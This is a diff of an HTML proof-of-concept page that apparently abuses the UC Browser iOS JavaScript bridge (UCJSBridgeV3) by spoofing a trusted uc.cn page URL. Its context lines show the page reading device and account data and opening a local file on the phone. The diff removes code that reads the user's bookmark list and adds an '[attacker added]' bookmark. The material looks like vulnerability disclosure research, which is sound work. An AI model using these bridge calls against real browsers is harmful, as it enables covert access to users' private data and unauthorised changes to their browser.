@@ -63,15 +63,6 @@
     <p><span class="larger">Get Your Device Info:</span></p>
     <p style="font-size: 15px;" id="Battery"></p>
 
-    <p><span class="larger">Get your BookMark List:</span></p>
-    <p style="font-size: 15px;" id="BookMarkList"></p>
-
-    <p><span class="larger">Add BookMarks to your browser:</span></p>
-    Will add the following Bookmark to your browser:<br>
-        url: "https://zhouziyi1.github.io",<br>
-        title: "[attacker added] Bookmark page"
-    <input type="button" value="Add BookMark" id="AddBookMark" style="font-size: 20px; padding: 20px 25px;"/>
-
     <p><span class="larger">Open Local File on your phone:</span></p>
     Will open the following file on your phone:<br>
     "/private/var/mobile/Documents/localPDF.pdf"
@@ -119,43 +110,6 @@
         document.getElementById("AccountMobileWG").innerText = "Your UC Account Mobile_wg: " + AccountMobileWG;
     });
 
-    document.getElementById("AddBookMark").onclick = function () {
-        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
-            invokeId: "callback",
-            methodName: "base.addBookmark",
-            methodParams: {
-                url: "https://zhouziyi1.github.io",
-                title: "[attacker added] Bookmark page"
-            },
-            pageURL: "https://www.uc.cn/",
-            windowId: window.ucapi.windowId
-        }).then(function(a) {
-        });
-    }
-
-    var r = +new Date;
-    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
-        invokeId: "callback",
-        methodName: "base.getBookmarkList",
-        methodParams: {
-            begin_index: 0,
-            count: 100
-        },
-        pageURL: "https://www.uc.cn/",
-        windowId: window.ucapi.windowId
-    }).then(function(a) {
-        var json = a;
-
-        var BookMarkNum = json.total_count;
-        const jsonData = json.list;
-        const bookmarkListElement = document.getElementById("BookMarkList");
-        bookmarkListElement.innerText = "Your BookMark List: \n\n" + "Total Count: " + BookMarkNum + "\n\n";
-        jsonData.forEach(bookmark => {
-            const bookmarkText = JSON.stringify(bookmark);
-            bookmarkListElement.innerText += bookmarkText + '\n\n';
-        });
-
-    });
 
     document.getElementById("OpenFile").onclick = function () {
         window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
